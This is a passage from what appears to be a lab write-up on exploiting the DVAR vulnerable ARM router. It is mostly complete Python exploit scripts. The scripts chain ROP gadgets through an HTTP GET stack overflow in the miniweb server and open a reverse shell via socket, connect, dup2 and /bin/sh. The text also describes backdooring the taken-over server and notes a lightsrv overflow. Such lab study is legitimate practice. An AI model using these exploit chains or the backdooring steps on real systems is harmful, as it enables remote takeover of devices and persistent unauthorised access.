        payload += p32(g_add_r1_1_with_r0_cmp_ea)
        payload += p32(stack_dummy_ea) # r4
        payload += p32(g_mov_r0_r4_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(g_add_r2_1_ea)
        payload += p32(0xdeadbeef) # r4
        for _ in range(16):
            payload += p32(g_add_r2_1_ea)
            payload += p32(stack_csock_ea) # r4
        payload += p32(g_ldr_r0_r4_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(0xdeadbeef) # r5
        payload += p32(0xdeadbeef) # r6
        payload += p32(connect_ea) # connect(csock, sin, 16) 
                                   # (will pop {r3-r7, pc})
        payload += p32(0xdeadbeef) # r3
        payload += p32(0xdeadbeef) # r4
        payload += p32(0xdeadbeef) # r5
        payload += p32(0xdeadbeef) # r6
        payload += p32(0xdeadbeef) # r7 
        payload += p32(g_mov_r1_0_ea)
        payload += p32(stack_csock_ea) # r4
        payload += p32(0xdeadbeef) # r5
        payload += p32(0xdeadbeef) # r6
        payload += p32(g_ldr_r0_r4_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(0xdeadbeef) # r5
        payload += p32(0xdeadbeef) # r6
        payload += p32(dup2_ea) # dup2(csock, 0) (will pop {r7, pc})
        payload += p32(0xdeadbeef) # r7
        payload += p32(g_mov_r1_0_ea) # also set r0 to 0
        payload += p32(0xdeadbeef) # r4
        payload += p32(0xdeadbeef) # r5
        payload += p32(0xdeadbeef) # r6
        payload += p32(g_add_r1_1_with_r0_cmp_ea)
        payload += p32(stack_csock_ea) # r4
        payload += p32(g_ldr_r0_r4_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(0xdeadbeef) # r5
        payload += p32(0xdeadbeef) # r6
        payload += p32(dup2_ea) # dup2(csock, 1) 
        payload += p32(0xdeadbeef) # r7
        payload += p32(g_mov_r1_0_ea) # also set r0 to 0
        payload += p32(0xdeadbeef) # r4
        payload += p32(0xdeadbeef) # r5
        payload += p32(0xdeadbeef) # r6
        payload += p32(g_add_r1_1_with_r0_cmp_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(g_add_r1_1_with_r0_cmp_ea)
        payload += p32(stack_csock_ea) # r4
        payload += p32(g_ldr_r0_r4_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(0xdeadbeef) # r5
        payload += p32(0xdeadbeef) # r6
        payload += p32(dup2_ea) # dup2(csock, 2)
        payload += p32(0xdeadbeef) # r7
        payload += p32(g_pop_r4_ea)
        payload += p32(stack_dummy_ea) # r4
        payload += p32(g_mov_r0_r4_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(g_pop_r1_r2_r3_ea)
        payload += p32(0xdeadbeef) # r1
        payload += p32(0xffffffff) # r2
        payload += p32(0xdeadbeef) # r3
        payload += p32(g_add_r2_1_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(g_mov_r1_0_ea) # also set r0 to 0
        payload += p32(binsh_ea)
        payload += p32(0xdeadbeef) # r5
        payload += p32(0xdeadbeef) # r6
        payload += p32(g_mov_r0_r4_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(execve_stub_ea) # execve("/bin/sh", NULL, NULL)
       

        
        with open("payload.bin", "wb+") as f:
            f.write(payload)

        if check_null_bytes(payload):
            exit(1)


        req = b'GET /' + urlencode(payload).encode() + b' HTTP/1.1\r\n'
        req += b'Host: ' + args.host[0].encode() + b'\r\n'
        req += b'\r\n'
        #req = b'GET /' + payload + b' HTTP/1.1\r\n'
        #req += b'Host: ' + args.host[0].encode() + b'\r\n'
        #req += b'\r\n'

        with open("request.txt", "wb+") as f:
            f.write(req)

        l = listen(args.listen)
    
        th = send_delayed(p, req, 1.0)

        c = l.wait_for_connection()
        th.join()
        c.interactive()


    else:
        parser.print_help()
        exit(1)
```


![exploit local](/img/dvar/exploit-local.png)

Now need to modify stack buffer address (for sin) and libc base address (for gadgets and funcs) to work with the real server.

After modif, use following script:
```python
#!/usr/bin/env python3

from pwn import *
import argparse
import os
import struct
import socket
from urllib.parse import quote_plus as urlencode
import threading

context.arch = 'arm'
context.bits = 32
context.endian = 'little'
#context.log_level = 'error'

# Base address
#base_address = 0xff737000 # (local) 0x40000000  # 0xff737000 
base_address = 0x40034000


# Calculating virtual addresses
g_pop_r4_ea = base_address + 0x0003a73c # 0x0000bac4  # null (alt: 0x0003a73c)
g_mov_r0_r4_ea = base_address + 0x00015ed8
g_ldr_r0_r4_ea = base_address + 0x0001b714
g_mov_r0_0_ea = base_address + 0x00028bc8 # 0x0000eef0 # null (alt: 0x00028bc8 with one pop)
g_pop_r1_ea = base_address + 0x000129e4
g_add_r0_2_ea = base_address + 0x0002f850 # 0x000300f4 # null (alt: 0x0002f850 with one more pop)
g_add_r1_1_ea = base_address + 0x00030b48
g_add_r1_1_with_cmp_ea = base_address + 0x000305a8

g_mov_r1_0_ea = base_address + 0x0003a6d8
g_add_r1_1_with_r0_cmp_ea = base_address + 0x000305a8
g_mov_r2_0_ea = base_address + 0x00030d30
g_str_r0_r4_ea = base_address + 0x0002ae30
g_pop_r4_r6_r7_ea = base_address + 0x0001f3d8 
g_pop_r1_r2_r3_ea = base_address + 0x000129e4
g_pop_r3_ea = base_address + 0x00016298
g_add_r2_1_ea = base_address + 0x00029110
g_strb_r0_r4_ea = base_address + 0x0003a4a4 
g_pop_r7_ea = base_address + 0x00041ff0

dup2_ea = base_address + 0xb328 + 4 # +4 to skip PUSH {R7, LR} # null (patch 0xff byte)
binsh_ea = base_address + 0x46080 
system_ea = base_address + 0x43928 # 0x438dc + 4 
socket_ea = base_address + 0x3a240 + 4 
connect_ea = base_address + 0x39bd8 + 4
exit_ea = base_address + 0x3f2dc + 4
#execve_stub_ea = base_address + 0x43584 
execve_stub_ea = base_address + 0xb45c
syscall_ea = base_address + 0x00032b3c

stack_buf_start = 0xbeffb66c
#stack_buf_start = 0xfffeac8c
stack_buf_data_off = 368
stack_buf_data_start = stack_buf_start + stack_buf_data_off
stack_sin_ea = stack_buf_data_start + 0x10   # 0xfffeae20
stack_dummy_ea = stack_buf_data_start 
stack_csock_ea = stack_buf_data_start + 0x28


HOST = ('192.168.100.2', 80)

def parse_host(host):
    try:
        ip, port = host.split(":")
    except:
        raise argparse.ArgumentTypeError("host must be in format <ip>:<port>")
    return (ip, int(port))


def check_null_bytes(data):
    if b'\x00' in data:
        from termcolor import colored
        print("payload contains null bytes")
        print("[payload]\n")
        payload = 'ff' + data.hex()
        # chunk by byte (2 characters) and iterate
        for i in range(0, len(payload), 2):
            if i != 0 and (i % (4*2)) == 0:
                print()
            if payload[i:i+2] == '00':
                print(colored(payload[i:i+2], 'red'), end='')
            else:
                print(payload[i:i+2], end='')
        print()
        return True
    return False 


def _send_delayed_routine(p, data, delay=1.0):
    time.sleep(delay)
    print(f"Sending {len(data)} bytes")
    p.send(data)

def send_delayed(p, data, delay=1.0):
    thread = threading.Thread(target=_send_delayed_routine, args=(p,data, delay,))
    thread.start()
    return thread

    


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Exploit for DVAR")

    subparsers = parser.add_subparsers(dest="command")
    
    miniweb_parser = subparsers.add_parser("miniweb", help="Run miniweb")

    parser.add_argument("-H", "--host", type=parse_host, default=HOST, required=True, help="Target host (format = <ip>:<port>)")

    parser.add_argument("-l", "--listen", type=int, default=1337, help="Port to listen on for reverse shell connection")
    
    args = parser.parse_args()

    p = remote(args.host[0], args.host[1])
    
    if args.command == "miniweb":

        variables = {
            "g_pop_r4": g_pop_r4_ea,
            "g_mov_r0_r4": g_mov_r0_r4_ea,
            "g_ldr_r0_r4": g_ldr_r0_r4_ea,
            "g_mov_r0_0": g_mov_r0_0_ea,
            "g_pop_r1": g_pop_r1_ea,
            "g_add_r0_2": g_add_r0_2_ea,
            "g_add_r1_1": g_add_r1_1_ea,
            "g_add_r1_1_with_cmp": g_add_r1_1_with_cmp_ea,
            "g_mov_r1_0": g_mov_r1_0_ea,
            "g_add_r1_1_with_r0_cmp": g_add_r1_1_with_r0_cmp_ea,
            "g_mov_r2_0": g_mov_r2_0_ea,
            "g_str_r0_r4": g_str_r0_r4_ea,
            "g_pop_r1_r2_r3": g_pop_r1_r2_r3_ea,
            "g_pop_r3": g_pop_r3_ea,
            "g_add_r2_1": g_add_r2_1_ea,
            "g_strb_r0_r4": g_strb_r0_r4_ea
        }

        print('[gadgets]')
        for name, virt_addr in variables.items():
            print(f"{name} = {hex(virt_addr)} ({hex(virt_addr - base_address)})")

        print('[variables]')
        print('@dummy = ', hex(stack_dummy_ea))
        print('@csock = ', hex(stack_csock_ea))
        print('@sin =   ', hex(stack_sin_ea))
    

        print('[funcs]')
        print('@system = ', hex(system_ea))
        print('@binsh =  ', hex(binsh_ea))
        print('@dup2 =   ', hex(dup2_ea))
        print('@socket = ', hex(socket_ea))
        print('@connect =', hex(connect_ea))
        print('@exit =   ', hex(exit_ea))
        print('@execve = ', hex(execve_stub_ea))
        

        sin_family = 0xff02 
        sin_port = socket.htons(args.listen) 
        sin_addr = socket.inet_aton("192.168.1.156")
        sin_zero = b'\x01' * 8

        sin = struct.pack('<HH', sin_family, sin_port) + sin_addr + sin_zero
        print(sin)

        local_off = 299 
        remote_off = 172
        data_size = 48
        offset = remote_off - (data_size)
        payload = b'A' * offset # 173

        # data area
        payload += b'x' * 0x10
        payload += sin
        payload += b'x' * 16

        # reached @ret
        payload += p32(g_mov_r1_0_ea) # also set r0 to 0
        payload += b'B'*16
        payload += p32(0xdeadbeef) # r4
        payload += p32(0xdeadbeef) # r5
        payload += p32(0xdeadbeef) # r6
        payload += p32(g_add_r1_1_with_r0_cmp_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(g_add_r0_2_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(0xdeadbeef) # r5
        payload += p32(g_pop_r3_ea)
        payload += p32(stack_dummy_ea) # r3
        payload += p32(g_mov_r2_0_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(socket_ea) # csock = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
                                  # (will pop {r7, pc})
        payload += p32(0xdeadbeef) # r7
        payload += p32(g_pop_r4_ea)
        payload += p32(stack_csock_ea) # r4
        payload += p32(g_str_r0_r4_ea)
        # fix struct sockaddr_in
        payload += p32(0xdeadbeef) # r4
        payload += p32(g_mov_r0_0_ea)
        payload += p32(stack_sin_ea+1) # r4
        payload += p32(g_strb_r0_r4_ea)
        payload += p32(stack_sin_ea+8) # r4
        payload += p32(g_str_r0_r4_ea)
        payload += p32(stack_sin_ea+12) # r4
        payload += p32(g_str_r0_r4_ea)
        # prepare args in regs
        payload += p32(stack_csock_ea) # r4
        payload += p32(g_pop_r1_r2_r3_ea)
        payload += p32(stack_sin_ea-1) # r1
        payload += p32(0xffffffff) # r2
        payload += p32(stack_dummy_ea) # r3
        payload += p32(g_mov_r0_0_ea)
        payload += p32(0xdeadbeef) # r7
        payload += p32(g_add_r1_1_with_r0_cmp_ea)
        payload += p32(stack_dummy_ea) # r4
        payload += p32(g_mov_r0_r4_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(g_add_r2_1_ea)
        payload += p32(0xdeadbeef) # r4
        for _ in range(16):
            payload += p32(g_add_r2_1_ea)
            payload += p32(stack_csock_ea) # r4
        payload += p32(g_ldr_r0_r4_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(0xdeadbeef) # r5
        payload += p32(0xdeadbeef) # r6
        payload += p32(connect_ea) # connect(csock, sin, 16) 
                                   # (will pop {r3-r7, pc})
        payload += p32(0xdeadbeef) # r3
        payload += p32(0xdeadbeef) # r4
        payload += p32(0xdeadbeef) # r5
        payload += p32(0xdeadbeef) # r6
        payload += p32(0xdeadbeef) # r7 (addr to patch = ) 
        payload += p32(g_mov_r1_0_ea)
        payload += p32(stack_csock_ea) # r4
        payload += p32(0xdeadbeef) # r5
        payload += p32(0xdeadbeef) # r6
        payload += p32(g_ldr_r0_r4_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(0xdeadbeef) # r5
        payload += p32(0xdeadbeef) # r6
        payload += p32(dup2_ea) # dup2(csock, 0) (will pop {r7, pc})
        payload += p32(0xdeadbeef) # r2
        payload += p32(g_mov_r1_0_ea) # also set r0 to 0
        payload += p32(0xdeadbeef) # r4
        payload += p32(0xdeadbeef) # r5
        payload += p32(0xdeadbeef) # r6
        payload += p32(g_add_r1_1_with_r0_cmp_ea)
        payload += p32(stack_csock_ea) # r4
        payload += p32(g_ldr_r0_r4_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(0xdeadbeef) # r5
        payload += p32(0xdeadbeef) # r6
        payload += p32(dup2_ea) # dup2(csock, 1) 
        payload += p32(0xdeadbeef) # r7
        payload += p32(g_mov_r1_0_ea) # also set r0 to 0
        payload += p32(0xdeadbeef) # r4
        payload += p32(0xdeadbeef) # r5
        payload += p32(0xdeadbeef) # r6
        payload += p32(g_add_r1_1_with_r0_cmp_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(g_add_r1_1_with_r0_cmp_ea)
        payload += p32(stack_csock_ea) # r4
        payload += p32(g_ldr_r0_r4_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(0xdeadbeef) # r5
        payload += p32(0xdeadbeef) # r6
        payload += p32(dup2_ea) # dup2(csock, 2)
        payload += p32(0xdeadbeef) # r7
        payload += p32(g_pop_r4_ea)
        payload += p32(stack_dummy_ea) # r4
        payload += p32(g_mov_r0_r4_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(g_pop_r1_r2_r3_ea)
        payload += p32(stack_sin_ea+8) # r1
        payload += p32(stack_sin_ea+8) # r1
        payload += p32(0xdeadbeef)
        #payload += p32(0xdeadbeef) # r1
        #payload += p32(0xffffffff) # r2
        #payload += p32(0xdeadbeef) # r3
        #payload += p32(g_add_r2_1_ea)
        #payload += p32(0xdeadbeef) # r4
        #payload += p32(g_mov_r1_0_ea) # also set r0 to 0
        payload += p32(g_pop_r4_ea)
        payload += p32(binsh_ea)
        payload += p32(g_mov_r0_r4_ea)
        payload += p32(0xdeadbeef) # r4
        payload += p32(system_ea) # execve("/bin/sh", NULL, NULL)
       

        
        with open("payload.bin", "wb+") as f:
            f.write(payload)

        if check_null_bytes(payload):
            exit(1)


        req = b'GET /' + urlencode(payload).encode() + b' HTTP/1.1\r\n'
        req += b'Host: ' + args.host[0].encode() + b'\r\n'
        req += b'\r\n'
        #req = b'GET /' + payload + b' HTTP/1.1\r\n'
        #req += b'Host: ' + args.host[0].encode() + b'\r\n'
        #req += b'\r\n'

        with open("request.txt", "wb+") as f:
            f.write(req)

        l = listen(args.listen)
    
        th = send_delayed(p, req, 1.0)

        c = l.wait_for_connection()
        th.join()
        c.interactive()


    else:
        parser.print_help()
        exit(1)
    
```

![Remote exploit of DVAR](/img/dvar/exploit-remote.png)

##### Backdooring miniweb

Now, we don't want other attackers to exploit the same vuln and enter OUR server (yes it is now). 

What we need to do is:
- remove buffer overflow vuln (so that the server doesn't crash anymore)
- backdoor a relevant function which is being called with our input
    - interesting functions:
        - `urldecode`: will always be call with the url as argument
        - `gstricmp`: will be called if `Host` field is provided, field value passed as 2nd argument
        - `strstr`: will always be called with the url as argument


#### lightsrv

##### Reversing

buffer overflow in `handle_single_request`

crash when `Content-Length` header is provided and value makes the HTTP request overflows the stack buffer (size 4136) its being copied in.

##### Exploitation
